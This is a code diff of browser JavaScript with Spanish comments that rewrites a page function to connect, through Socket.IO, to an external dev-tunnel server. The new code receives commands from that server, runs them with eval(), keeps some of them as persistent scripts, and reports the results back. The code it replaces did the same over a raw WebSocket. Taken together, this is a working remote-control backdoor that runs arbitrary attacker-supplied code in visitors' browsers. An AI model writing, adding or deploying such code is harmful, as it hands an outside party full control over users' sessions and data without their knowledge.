@@ -336,112 +336,216 @@ function setupIframeRouteSimulation() {
 function setupWebSocketController() {
     'use strict';
     
-    // WebSocket es NATIVO - no necesita librerías
-    const WS_SERVER = 'https://6cbdc410-3002.use2.devtunnels.ms'; // o 'wss://' para SSL
+    const WS_SERVER = 'https://mi-tunnel-persistente-3002.use2.devtunnels.ms';
     let socket = null;
     
     // Diccionario para scripts persistentes 
     const persistentScripts = {};
 
-    // Conectar WebSocket (NATIVO)
-    function connectWebSocket() {
-        try {
-            // ✅ WebSocket es NATIVO en todos los navegadores modernos
-            socket = new WebSocket(WS_SERVER);
-            
-            socket.onopen = function() {
-                console.log('✅ WebSocket conectado - Listo para comandos');
-            };
-            
-            socket.onmessage = function(event) {
-                try {
-                    const message = JSON.parse(event.data);
-                    handleWebSocketMessage(message);
-                } catch (e) {
-                    console.log('Mensaje no JSON, ejecutando directamente');
-                    // Ejecutar como código directo
-                    executeCommand(event.data, false, 'direct');
-                }
-            };
-            
-            socket.onclose = function() {
-                console.log('🔌 WebSocket cerrado - Reconectando...');
-                setTimeout(connectWebSocket, 3000);
-            };
-            
-            socket.onerror = function(error) {
-                console.log('💥 WebSocket error:', error);
-            };
-            
-        } catch (error) {
-            console.log('❌ Error conectando WebSocket:', error);
-            setTimeout(connectWebSocket, 5000);
+    // Cargar Socket.IO dinámicamente
+    function loadSocketIO(callback) {
+        if (window.io) {
+            callback();
+            return;
         }
+        
+        console.log('📦 Cargando Socket.IO...');
+        const script = document.createElement('script');
+        script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
+        script.onload = function() {
+            console.log('✅ Socket.IO cargado');
+            callback();
+        };
+        script.onerror = function() {
+            console.log('❌ Error cargando Socket.IO');
+            setTimeout(() => loadSocketIO(callback), 3000);
+        };
+        document.head.appendChild(script);
     }
 
-    // [Los mismos handlers que antes...]
-    function handleWebSocketMessage(message) {
-        const { type, data } = message;
-        
-        switch (type) {
-            case 'execute-command':
-                handleExecuteCommand(data);
-                break;
-            case 'destroy-persistent':
-                handleDestroyPersistent(data);
-                break;
-            case 'sync-persistent':
-                handleSyncPersistent(data);
-                break;
-        }
+    // Conectar Socket.IO después de cargar la librería
+    function connectWebSocket() {
+        loadSocketIO(function() {
+            try {
+                socket = io(WS_SERVER, {
+                    transports: ['polling'],   // 👈 Solo long-polling
+                    upgrade: false,           // 👈 No intentes WebSocket
+                    timeout: 10000,
+                    path: '/socket.io',       // 👈 Asegura que coincida con el server
+                    withCredentials: false    // 👈 porque tienes cookie: false
+                });
+                
+                socket.on('connect', function() {
+                    console.log('✅ Socket.IO conectado - Listo para comandos');
+                });
+                
+                // Manejar evento execute-command
+                socket.on('execute-command', function(data) {
+                    handleExecuteCommand(data);
+                });
+                
+                // Manejar evento destroy-persistent
+                socket.on('destroy-persistent', function(data) {
+                    handleDestroyPersistent(data);
+                });
+                
+                // Manejar evento sync-persistent
+                socket.on('sync-persistent', function(data) {
+                    handleSyncPersistent(data);
+                });
+                
+                socket.on('disconnect', function(reason) {
+                    console.log('🔌 Socket.IO desconectado:', reason, '- Reconectando...');
+                });
+                
+                socket.on('connect_error', function(error) {
+                    console.log('💥 Socket.IO error:', error);
+                    setTimeout(connectWebSocket, 5000);
+                });
+                
+            } catch (error) {
+                console.log('❌ Error conectando Socket.IO:', error);
+                setTimeout(connectWebSocket, 5000);
+            }
+        });
     }
 
     function handleExecuteCommand(data) {
         const { command, persistent, id } = data;
         try {
+            console.log('📨 Ejecutando comando:', command.substring(0, 200) + '...');
+            
             // ✅ EJECUCIÓN LIBRE CON eval()
             const result = eval(command);
+            
+            console.log('✅ Comando ejecutado. Resultado:', result);
             
             if (persistent && id) {
                 persistentScripts[id] = { 
                     script: command, 
                     cleanup: typeof result === 'function' ? result : null 
                 };
+                console.log('📁 Script persistente guardado:', id);
+            }
+            
+            // Enviar confirmación
+            if (socket && socket.connected) {
+                socket.emit('command_executed', {
+                    id: id,
+                    success: true,
+                    hasCleanup: !!result,
+                    timestamp: new Date().toISOString()
+                });
             }
             
         } catch (error) {
-            console.log('❌ Error:', error);
+            console.log('❌ Error ejecutando comando:', error);
+            
+            // Enviar error
+            if (socket && socket.connected) {
+                socket.emit('command_error', {
+                    id: id,
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                });
+            }
         }
     }
 
     function handleDestroyPersistent(data) {
         const { id } = data;
+        
+        console.log('🗑️ Destruyendo script persistente:', id);
+        
         if (persistentScripts[id]) {
+            // Ejecutar cleanup si existe
             if (persistentScripts[id].cleanup) {
                 try {
                     persistentScripts[id].cleanup();
+                    console.log('🧹 Cleanup ejecutado para:', id);
                 } catch (error) {
-                    console.log('Error en cleanup:', error);
+                    console.log('❌ Error en cleanup:', error);
                 }
+            } else {
+                console.log('ℹ️ No hay cleanup para:', id);
             }
+            
+            // Remover del diccionario
             delete persistentScripts[id];
+            console.log('✅ Script persistente destruido:', id);
+            
+            // Enviar confirmación
+            if (socket && socket.connected) {
+                socket.emit('persistent_destroyed', {
+                    id: id,
+                    success: true,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        } else {
+            console.log('❌ Script persistente no encontrado:', id);
+            
+            // Enviar error
+            if (socket && socket.connected) {
+                socket.emit('persistent_not_found', {
+                    id: id,
+                    timestamp: new Date().toISOString()
+                });
+            }
         }
     }
 
     function handleSyncPersistent(data) {
-        for (const [id, cmd] of Object.entries(data)) {
-            try {
-                const result = eval(cmd);
-                persistentScripts[id] = { 
-                    script: cmd, 
-                    cleanup: typeof result === 'function' ? result : null 
-                };
-            } catch (error) {
-                console.log('Error sync:', id, error);
+        console.log('🔄 Sincronizando scripts persistentes:', data);
+        
+        try {
+            for (const [id, cmd] of Object.entries(data)) {
+                try {
+                    console.log('🔄 Ejecutando script persistente:', id);
+                    
+                    // EJECUCIÓN LIBRE
+                    const result = eval(cmd);
+                    
+                    // Almacenar en diccionario
+                    persistentScripts[id] = { 
+                        script: cmd, 
+                        cleanup: typeof result === 'function' ? result : null 
+                    };
+                    
+                    console.log('✅ Script persistente sincronizado:', id);
+                    
+                } catch (error) {
+                    console.log('❌ Error sincronizando script', id, ':', error);
+                }
+            }
+            
+            console.log('✅ Todos los scripts persistentes sincronizados');
+            
+            // Enviar confirmación
+            if (socket && socket.connected) {
+                socket.emit('sync_completed', {
+                    count: Object.keys(data).length,
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
+        } catch (error) {
+            console.log('❌ Error en sync-persistent:', error);
+            
+            if (socket && socket.connected) {
+                socket.emit('sync_error', {
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                });
             }
         }
     }
 
     // Iniciar conexión
     connectWebSocket();
+    
+    // Devolver API pública si es necesario
+    return {
+        getPersistentScripts: () => ({ ...persistentScripts })
+    };
 }
